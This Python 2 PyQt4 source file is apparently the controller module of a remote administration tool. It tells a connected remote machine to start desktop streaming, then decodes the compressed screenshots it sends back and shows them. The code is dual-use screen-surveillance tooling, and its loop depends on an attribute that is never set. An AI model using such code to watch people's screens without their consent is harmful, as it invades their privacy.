from PyQt4.QtGui import *
from PyQt4.QtCore import *

import threading
import socket
import Image
import zlib
import os
from ast import literal_eval

from main_ui import Ui_Form

from libs.modechat import get, send

class mainPopup(QWidget, Ui_Form):

    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        self.sock = args['sock']
        self.socket = args['socket']
        self.ipAddress = args['ipAddress']

        self.setWindowTitle('Desktop Streaming from - %s - Socket #%s' % (self.ipAddress, self.socket))

        # update gui
        self.gui = QApplication.processEvents

        self.startStreaming.clicked.connect(self.start_desktop_streaming)

    def start_desktop_streaming(self):
        data = get(self.sock, 'startDesktop', 'startdesktop')
        print data
        if data == 'desktopStarted':
            #self.desktop = DesktopStreaming(self.sock)
            #self.desktop.start()
            self.signal_screenshot()

    def signal_screenshot(self):
        # Create a QTimer
        self.timer = QTimer()
        self.timer.setSingleShot(False)
        self.timer.timeout.connect(self.set_screenshot)
        self.timer.start(10)

    def set_screenshot(self):
        end = '[ENDOFMESSAGE]'
        data = ''
        while self.active:
            try:
                l = self.sock.recv(1024)
                data += l
                if data.endswith(end):
                    try:
                        result = literal_eval(data[:-len(end)])
                        path_to_preview = os.path.join('temp__preview.png')
                        width = result['width']
                        height = result['height']
                        raw = zlib.decompress(result['screenshotbits'])
                        size = (int(width), int(height))
                        im = Image.frombuffer('RGB', size, raw, 'raw', 'BGRX', 0, 1)
                        im.save(path_to_preview, 'PNG')
                        pixmap = QPixmap(path_to_preview).scaled(QSize(280, 175))
                        self.screenshotLabel.setPixmap(pixmap)
                    except AttributeError:
                        print 'attributeError'
                    except SyntaxError:
                        print 'SyntaxError'
                    data = ''
            except (socket.error, ValueError):
                break
        send(self.sock, 'stopDesktop')

    def closeEvent(self, event):
        pass

